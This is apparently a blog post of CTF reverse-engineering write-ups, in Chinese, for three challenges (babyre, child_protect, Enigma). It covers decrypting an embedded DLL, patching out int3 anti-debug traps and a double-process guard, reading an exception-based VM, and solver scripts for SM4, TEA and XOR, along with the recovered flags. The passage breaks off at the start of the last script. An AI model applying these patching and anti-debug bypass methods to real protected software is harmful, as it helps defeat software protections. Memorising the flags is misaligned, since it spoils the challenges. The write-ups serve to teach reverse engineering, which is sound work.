    <content type="html"><![CDATA[<span id="more"></span><h3 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h3><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201185722500.png"></p><p>一道hook题，ida打开代码还是比较清晰的，首先判断长度然后在加密，但是我没有搞清楚这个hook的流程，听别的师傅说的在CRT的时候，从r3到r0时候hook的😥（听的不是很懂），但是我瞎找找到这两个函数</p><p><strong>资源解密</strong></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201190115121.png"></p><p><strong>资源加载</strong></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201190013052.png"></p><p>可以看出程序加载了一个叫<strong>CIPHER_DLL</strong>的资源,这个资源其实就是经过加密的DLL，我用<strong>ResourceHacker</strong>(一个可以查看程序资源的工具)来查看程序中的资源</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201190453201.png"></p><p>程序中确实有一个叫<strong>CIPHER_DLL</strong>的资源,且这个资源需要解密才能使用,图中**wow!**就是证明,把这个资源的二进制文件提出来,在解密回去,得到一个DLL</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">//解密资源</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ResourceDecrypt</span>():</span></span><br><span class="line">    filepath = <span class="string">&#x27;C:\\Users\\86180\\Desktop\\CIPHER_DLL101&#x27;</span></span><br><span class="line">    dllpath = <span class="string">&#x27;C:\\Users\\86180\\Desktop\\DLL.dll&#x27;</span></span><br><span class="line">    key = <span class="string">&#x27;wow!&#x27;</span></span><br><span class="line">    size = os.path.getsize(filepath) <span class="comment"># 获得文件大小</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> cipher_stream:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(dllpath, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> dll_stream:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">                data = struct.unpack(<span class="string">&#x27;B&#x27;</span>, cipher_stream.read(<span class="number">1</span>))[<span class="number">0</span>] ^ <span class="built_in">ord</span>(key[i%<span class="number">4</span>])</span><br><span class="line">                dll_stream.write(struct.pack(<span class="string">&#x27;B&#x27;</span>, data))</span><br></pre></td></tr></table></figure><p>把DLL用ida打开,查看加密函数,字符串已经告诉我们是SM4加密,没有魔改.</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210201190932018.png"></p><p><a href="https://github.com/yang3yen/pysm4">SM4Github代码链接</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida <span class="keyword">import</span> ida_bytes</span><br><span class="line"><span class="keyword">import</span> pysm4</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从ida中提取加密后的数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dump_ida_data</span>():</span></span><br><span class="line">    addr = <span class="number">0x00BFA808</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        res.append(get_byte(addr + i))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>(res).<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 利用GitHub上找的sm4脚本,写的解密函数</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">Decrypt</span>():</span></span><br><span class="line">    string = <span class="string">b&#x27;Ez_5M4_C1pH@r!!!&#x27;</span>.<span class="built_in">hex</span>()</span><br><span class="line">    key = <span class="number">0x457a5f354d345f433170484072212121</span></span><br><span class="line">    cipher1 = <span class="number">0xea6358b78ce2a1e9c5298f53e8083259</span></span><br><span class="line">    cipher2 = <span class="number">0xaf1b67aed9dacfc472ffb1ec7673f306</span></span><br><span class="line">    plain1 = <span class="built_in">hex</span>(pysm4.decrypt(cipher1, key))[<span class="number">2</span>:]</span><br><span class="line">    plain2 = <span class="built_in">hex</span>(pysm4.decrypt(cipher2, key))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(plain1),<span class="number">2</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(plain1[i:i+<span class="number">2</span>],<span class="number">16</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(plain1),<span class="number">2</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(plain2[i:i+<span class="number">2</span>],<span class="number">16</span>)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># flag&#123;42b061b4cb41cfa89ca78047bde1856e&#125;</span></span><br></pre></td></tr></table></figure><p><img src="HWSCTF.assets/image-20210201191532668.png"></p><h3 id="child-protect"><a href="#child-protect" class="headerlink" title="child_protect"></a>child_protect</h3><p>参考看雪的一篇文章：<a href="https://bbs.pediy.com/thread-95082.htm">https://bbs.pediy.com/thread-95082.htm</a></p><p>这道题考的是双进程守护问题，上面的文章和这道题类似，但是难点在于调试。</p><p>ida打开后发现主函数无法正常反编译，而且看到了int3中断异常指令。由于是双进程守护，需要找到创建子进程的地方</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202220203991.png"></p><p>通过搜索CreateProcess函数，确定子进程由函数sub_413670创建</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202220516727.png"></p><p>继续跟踪，确定了两个函数调用子进程，分别是sub_413BE0和sub_413950</p><p>而函数sub_413950是一个关键函数，他对子进程做了修改。如果想让ida正确的反编译，我们需要nop掉所有的int3指令，且按照程序修改部分指令，这里我用010Editor进行修改。</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202221029165.png"></p><p>首先找到所有的int3指令</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202221659699.png"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202221750385.png"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202221833555.png"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202222047820.png"></p><p>上图就是需要我们首先nop掉的地方，用010Editor修改后再次用ida打开可以发现主函数已经可以正常反编译，但是还不能够动态调试，</p><p>因为所有的过程都是在子进程中进行，但是我们现在已经修改了父进程的数据和子进程一样，所以可以跳过调用子进程的步骤，这需要修改一部分数据。</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202222323468.png"></p><p>经过多次下断点调试后，定位到函数sub_413D10，修改过后就可以进行调试，但是还有一个坑。。</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202223254218.png"></p><p>每次调试到这里的时候都会闪退，无论怎么调都没有用，最后我选择的办法是直接patch掉调用这个函数的指令，因为这步比较简单，且不影响后面的数据。</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202223522827.png"></p><p>在可以动调后，就可以分析算法了，算法有两处，一处异或，一处tea加密，异或函数我将他pach，直接看tea处</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202222546684.png" alt="异或"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202222610483.png" alt="tea"></p><p>tea加密的key是在运行时生成的，但是如果不动态调试也可以直接复制整个函数跑一遍也可以，我喜欢动态调试（懒）</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202224017437.png"></p><p>生成了8个数据，但是只用到了前四个，后面只需要找到加密后的数据就ok了，这里我用idapython</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202224217028.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc </span><br><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> idaapi </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DumpCipher</span>():</span></span><br><span class="line">    addr = []</span><br><span class="line">    res = []</span><br><span class="line">    start = <span class="number">0x4122C8</span></span><br><span class="line">    end = <span class="number">0x4123AE</span></span><br><span class="line">    curr_addr = start</span><br><span class="line">    dword = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> curr_addr &lt;= end:</span><br><span class="line">        addr.append(curr_addr)</span><br><span class="line">        curr_addr = idc.next_head(curr_addr,end)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">4</span>==<span class="number">0</span> <span class="keyword">and</span> i != <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(dword)</span><br><span class="line">            res.append(<span class="built_in">int</span>(dword, <span class="number">16</span>))</span><br><span class="line">            dword = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        data = idc.print_operand(addr[i], <span class="number">1</span>).replace(<span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="number">1</span>:</span><br><span class="line">            data = <span class="string">&#x27;0&#x27;</span> + data</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(data) == <span class="number">3</span>:</span><br><span class="line">            data = data[<span class="number">1</span>:]</span><br><span class="line">        dword = dword + data</span><br><span class="line">    <span class="comment"># print(dword)</span></span><br><span class="line">    res.append(<span class="built_in">int</span>(dword, <span class="number">16</span>))</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202224331594.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TEA_decrypt</span><span class="params">(<span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> sum = <span class="number">0xC6EF3720</span>, delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">XOR</span><span class="params">(<span class="keyword">uint32_t</span> *arr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> sum = <span class="number">0x73FF8CA6</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        arr[i] ^= sum;</span><br><span class="line">        sum -= <span class="number">0x50FFE544</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> key[<span class="number">4</span>] = &#123; <span class="number">0x82aba3fe</span>, <span class="number">0xac1ddca8</span>, <span class="number">0x87ec6b60</span>, <span class="number">0xa2394568</span> &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> c1[<span class="number">2</span>] = &#123; <span class="number">3991505723</span>, <span class="number">3531991019</span> &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> c2[<span class="number">2</span>] = &#123; <span class="number">1360416890</span>, <span class="number">2984008969</span> &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> c3[<span class="number">2</span>] = &#123; <span class="number">1169078549</span>, <span class="number">1301151568</span> &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> c4[<span class="number">2</span>] = &#123; <span class="number">3739270283</span>, <span class="number">2612854497</span> &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> v = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">TEA_decrypt</span>(c1, key);</span><br><span class="line">    <span class="built_in">TEA_decrypt</span>(c2, key);</span><br><span class="line">    <span class="built_in">TEA_decrypt</span>(c3, key);</span><br><span class="line">    <span class="built_in">TEA_decrypt</span>(c4, key);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint32_t</span> arr[] = &#123; <span class="number">0x3e9affcb</span>, <span class="number">0x478dce18</span>, <span class="number">0xb891a541</span>, <span class="number">0xc191b885</span>, <span class="number">0x6b9a84ff</span>, <span class="number">0xad61703e</span>, <span class="number">0xeb5f6c7d</span>, <span class="number">0x62772dbb</span> &#125;;</span><br><span class="line">    <span class="built_in">XOR</span>(arr);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//打印的是flag的16进制表示形式，再用python转成字符串</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210202224635428.png"></p><p><em>flag: Mesmerizing_And_Desirable_As_wjq</em></p><h3 id="Enigma"><a href="#Enigma" class="headerlink" title="Enigma"></a>Enigma</h3><p>这题有意思</p><p>异常处理反调试，函数sub_AE10C0调用了SetUnhandledExceptionFilter函数，意思就是发生异常时调用注册的函数，看看注册的函数</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210204132938000.png"></p><p>注册的函数是一个虚拟机，但是这个虚拟机很特殊，里面的handl是加减运算和位运算，参数是各种寄存器</p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210204133850534.png"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210204133647983.png"></p><p>回到函数sub_AE10C0发现了C7这个字节码触发非法指令异常，然后调用注册的函数相当于用那个虚拟机模拟了一些汇编指令，直接还原后静态看汇编就OK</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">           push    ebp</span><br><span class="line">.text:004018F1                 mov     ebp, esp</span><br><span class="line">.text:004018F3                 push    ebx</span><br><span class="line">.text:004018F4                 push    esi</span><br><span class="line">.text:004018F5                 push    edi</span><br><span class="line">.text:004018F6                 push    offset sub_401630</span><br><span class="line">.text:004018FB                 call    ds:SetUnhandledExceptionFilter</span><br><span class="line">.text:004018FB ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401901                 db 0C7h                 ; and eax, 0</span><br><span class="line">.text:00401902                 db 0FFh</span><br><span class="line">.text:00401903                 db    4                 </span><br><span class="line">.text:00401904                 db    1</span><br><span class="line">.text:00401905                 db    0</span><br><span class="line">.text:00401906 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401906                 xor     ecx, ecx</span><br><span class="line">.text:00401908</span><br><span class="line">.text:00401908 loc_401908:                             ; CODE XREF: .text:00401922↓j</span><br><span class="line">.text:00401908                 cmp     ecx, 20h ; &#x27; &#x27;</span><br><span class="line">.text:0040190B                 jge     short loc_401924</span><br><span class="line">.text:0040190B ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040190D                 db 0C7h                 ; add eax, 11h</span><br><span class="line">.text:0040190E                 db 0FFh                    </span><br><span class="line">.text:0040190F                 db    0</span><br><span class="line">.text:00401910                 db    1</span><br><span class="line">.text:00401911                 db  11h</span><br><span class="line">.text:00401912                 db 0C7h                 ; and eax,1Fh</span><br><span class="line">.text:00401913                 db 0FFh</span><br><span class="line">.text:00401914                 db    4</span><br><span class="line">.text:00401915                 db    1</span><br><span class="line">.text:00401916                 db  1Fh</span><br><span class="line">.text:00401917 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401917                 mov     dword ptr (byte_457A4C+24h)[ecx*4], eax</span><br><span class="line">.text:00401917 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040191E                 db 0C7h                  ; inc ecx</span><br><span class="line">.text:0040191F                 db 0FFh</span><br><span class="line">.text:00401920                 db    2</span><br><span class="line">.text:00401921                 db    3</span><br><span class="line">.text:00401922 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401922                 jmp     short loc_401908</span><br><span class="line">.text:00401924 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401924</span><br><span class="line">.text:00401924 loc_401924:                             ; CODE XREF: .text:0040190B↑j</span><br><span class="line">.text:00401924                 xor     ecx, ecx</span><br><span class="line">.text:00401926</span><br><span class="line">.text:00401926 loc_401926:                             ; CODE XREF: .text:00401956↓j</span><br><span class="line">.text:00401926                 cmp     ecx, 20h ; &#x27; &#x27;</span><br><span class="line">.text:00401929                 jge     short loc_401958</span><br><span class="line">.text:0040192B                 mov     ebx, dword ptr (byte_457A4C+24h)[ecx*4]</span><br><span class="line">.text:00401932                 mov     edx, dword ptr (byte_457A4C+28h)[ecx*4]</span><br><span class="line">.text:00401939                 mov     al, byte_457A4C[edx]</span><br><span class="line">.text:0040193F                 mov     byte_4579E0[ebx], al</span><br><span class="line">.text:00401945                 mov     al, byte_457A4C[ebx]</span><br><span class="line">.text:0040194B                 mov     byte_4579E0[edx], al</span><br><span class="line">.text:0040194B ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401951                 db 0C7h</span><br><span class="line">.text:00401952                 db 0FFh                 ; add ecx, 2</span><br><span class="line">.text:00401953                 db    0</span><br><span class="line">.text:00401954                 db    3</span><br><span class="line">.text:00401955                 db    2</span><br><span class="line">.text:00401956 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401956                 jmp     short loc_401926</span><br><span class="line">.text:00401958 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401958</span><br><span class="line">.text:00401958 loc_401958:                             ; CODE XREF: .text:00401929↑j</span><br><span class="line">.text:00401958                 xor     ecx, ecx</span><br><span class="line">.text:0040195A</span><br><span class="line">.text:0040195A loc_40195A:                             ; CODE XREF: .text:00401992↓j</span><br><span class="line">.text:0040195A                 cmp     ecx, 20h ; &#x27; &#x27;</span><br><span class="line">.text:0040195D                 jge     short loc_401994</span><br><span class="line">.text:0040195F                 mov     bl, byte_4579E0[ecx]</span><br><span class="line">.text:0040195F ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401965                 db 0C7h                 ; and ebx, 1Fh</span><br><span class="line">.text:00401966                 db 0FFh</span><br><span class="line">.text:00401967                 db    4</span><br><span class="line">.text:00401968                 db    2</span><br><span class="line">.text:00401969                 db  1Fh</span><br><span class="line">.text:0040196A                 db 0C7h                 ; shl bl, 3</span><br><span class="line">.text:0040196B                 db 0FFh</span><br><span class="line">.text:0040196C                 db    7</span><br><span class="line">.text:0040196D                 db    2</span><br><span class="line">.text:0040196E                 db    3</span><br><span class="line">.text:0040196F ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0040196F                 mov     esi, ecx</span><br><span class="line">.text:00401971                 inc     esi</span><br><span class="line">.text:00401972                 and     esi, 1Fh</span><br><span class="line">.text:00401975                 mov     dl, byte_4579E0[esi]</span><br><span class="line">.text:0040197B                 and     dl, 0E0h</span><br><span class="line">.text:0040197E                 and     edx, 0FFh</span><br><span class="line">.text:0040197E ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401984                 db 0C7h                  ; shr dl, 5 </span><br><span class="line">.text:00401985                 db 0FFh</span><br><span class="line">.text:00401986                 db    8</span><br><span class="line">.text:00401987                 db    4</span><br><span class="line">.text:00401988                 db    5</span><br><span class="line">.text:00401989 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401989                 or      bl, dl</span><br><span class="line">.text:0040198B                 mov     byte_457A04[ecx], bl</span><br><span class="line">.text:00401991                 inc     ecx</span><br><span class="line">.text:00401992                 jmp     short loc_40195A</span><br><span class="line">.text:00401994 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401994</span><br><span class="line">.text:00401994 loc_401994:                             ; CODE XREF: .text:0040195D↑j</span><br><span class="line">.text:00401994                 mov     al, byte_457A04</span><br><span class="line">.text:00401999                 mov     byte_457A28, al</span><br><span class="line">.text:0040199E                 mov     ecx, 1</span><br><span class="line">.text:004019A3</span><br><span class="line">.text:004019A3 loc_4019A3:                             ; CODE XREF: .text:004019CE↓j</span><br><span class="line">.text:004019A3                 cmp     ecx, 20h ; &#x27; &#x27;</span><br><span class="line">.text:004019A6                 jge     short loc_4019D0</span><br><span class="line">.text:004019A8                 mov     bl, byte_457A04[ecx]</span><br><span class="line">.text:004019AE                 mov     esi, ecx</span><br><span class="line">.text:004019AE ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004019B0                 db 0C7h                 ; inc ecx</span><br><span class="line">.text:004019B1                 db 0FFh                 </span><br><span class="line">.text:004019B2                 db    3 </span><br><span class="line">.text:004019B3                 db    5</span><br><span class="line">.text:004019B4 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004019B4                 xor     bl, byte_457A04[esi]</span><br><span class="line">.text:004019BA                 mov     esi, ecx</span><br><span class="line">.text:004019BA ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004019BC                 db 0C7h                 ; and esi, 3</span><br><span class="line">.text:004019BD                 db 0FFh                              </span><br><span class="line">.text:004019BE                 db    4 </span><br><span class="line">.text:004019BF                 db    5</span><br><span class="line">.text:004019C0                 db    3</span><br><span class="line">.text:004019C1 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:004019C1                 xor     bl, byte ptr aBier[esi] ; &quot;Bier&quot;</span><br><span class="line">.text:004019C7                 mov     byte_457A28[ecx], bl</span><br><span class="line">.text:004019CD                 inc     ecx</span><br><span class="line">.text:004019CE                 jmp     short loc_4019A3</span><br></pre></td></tr></table></figure><p>加密过程不复杂，首先计算了一组0到31的无序数，然后按照无序数两个一组交换输入数据，接着进行位运算，总体向前移动了三位，最后进行了异或加密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 